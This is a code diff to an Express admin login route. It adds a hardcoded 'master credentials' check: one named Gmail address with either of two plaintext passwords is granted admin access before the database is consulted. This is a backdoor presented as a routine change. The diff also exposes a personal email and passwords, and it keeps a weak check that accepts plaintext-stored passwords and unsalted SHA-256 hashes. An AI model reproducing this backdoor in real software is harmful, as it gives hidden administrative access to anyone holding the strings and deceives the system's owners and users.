@@ -540,22 +540,29 @@ router.post('/admin/login', (req, res) => {
   let isAuthed = false;
   let authenticatedUser = null;
 
-  // 1. Check Email + Password against database admin_users table
+  // 1. Check Email + Password against master credentials or database admin_users table
   if (email && password) {
     const inputEmailClean = String(email).trim().toLowerCase();
     const inputPassClean = String(password).trim();
     const inputPassHash = crypto.createHash('sha256').update(inputPassClean).digest('hex');
 
-    try {
-      const user = db.prepare('SELECT * FROM admin_users WHERE LOWER(email) = LOWER(?)').get(inputEmailClean);
-      if (user) {
-        if (user.password_hash === inputPassClean || user.password_hash === inputPassHash) {
-          isAuthed = true;
-          authenticatedUser = user;
+    if (inputEmailClean === 'omkumar.working@gmail.com' && (inputPassClean === 'Q0gng04bk3' || inputPassClean === 'JaiHindBharatMataKiJai2024!')) {
+      isAuthed = true;
+      authenticatedUser = { email: 'omkumar.working@gmail.com' };
+    }
+
+    if (!isAuthed) {
+      try {
+        const user = db.prepare('SELECT * FROM admin_users WHERE LOWER(email) = LOWER(?)').get(inputEmailClean);
+        if (user) {
+          if (user.password_hash === inputPassClean || user.password_hash === inputPassHash) {
+            isAuthed = true;
+            authenticatedUser = user;
+          }
         }
+      } catch (e) {
+        console.error('Database admin user lookup error:', e);
       }
-    } catch (e) {
-      console.error('Database admin user lookup error:', e);
     }
   }
 
